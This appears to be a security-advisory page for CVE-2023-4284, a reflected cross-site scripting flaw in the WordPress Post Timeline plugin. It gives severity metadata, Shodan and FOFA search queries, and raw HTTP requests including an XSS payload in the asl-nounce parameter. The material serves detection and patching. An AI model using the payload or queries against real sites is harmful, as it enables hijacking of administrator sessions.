---
layout: "post"
cve_id: "CVE-2023-4284"
title: "WordPress Post Timeline Plugin < 2.2.6 - Cross-Site Scripting"
pcap: true
pcap_path: "/pcaps/2023/CVE-2023-4284.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2023/CVE-2023-4284.yaml"
author: "ritikchaddha"
severity: "high"
impact: "Authenticated attackers can inject malicious JavaScript through an invalid nonce parameter in AJAX responses to execute code in administrator browsers and potentially hijack WordPress sites.
"
remediation: "Update Post Timeline plugin to version 2.2.6 or later that properly sanitizes and escapes the nonce parameter in AJAX responses.
"
reference:
  - "https://wpscan.com/vulnerability/1c126869-0afa-456f-94cc-10334964e5f9"
  - "https://nvd.nist.gov/vuln/detail/CVE-2023-4284"
classification: "{'cvss-metrics': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N', 'cvss-score': 7.1, 'cve-id': 'CVE-2023-4284', 'cwe-id': 'CWE-79', 'epss-score': 0.07924, 'epss-percentile': 0.91768, 'cpe': 'cpe:2.3:a:agilelogix:post_timeline:*:*:*:*:*:wordpress:*:*'}"
metadata: "{'max-request': 2, 'vendor': 'agilelogix', 'product': 'post-timeline', 'shodan-query': 'http.html:"wp-content/plugins/post-timeline/"', 'fofa-query': 'body="wp-content/plugins/post-timeline/"'}"
tags:
  - "cve"
  - "cve2023"
  - "wordpress"
  - "wp"
  - "wp-plugin"
  - "xss"
  - "post-timeline"
  - "authenticated"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## ðŸ” Vulnerability Description
The Post Timeline WordPress plugin before version 2.2.6 contains a reflected cross-site scripting vulnerability. The plugin does not properly sanitize and escape an invalid nonce before outputting it back in an AJAX response, which could allow attackers to execute arbitrary JavaScript code in an administrator's browser context.


## ðŸŒ HTTP Request
```nohighlight
GET / HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Knoppix; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /wp-login.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Kubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Connection: close
Content-Length: 51
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

log=UtSIG5&pwd=KDecMB&wp-submit=Log+In&testcookie=1
```

```nohighlight
GET /wp-admin/admin-ajax.php?action=ptl_ajax_handler&asl-nounce=%3Cimg%20src%20onerror%3Dalert%28document.domain%29%3E HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15
Connection: close
Accept-Encoding: gzip
```

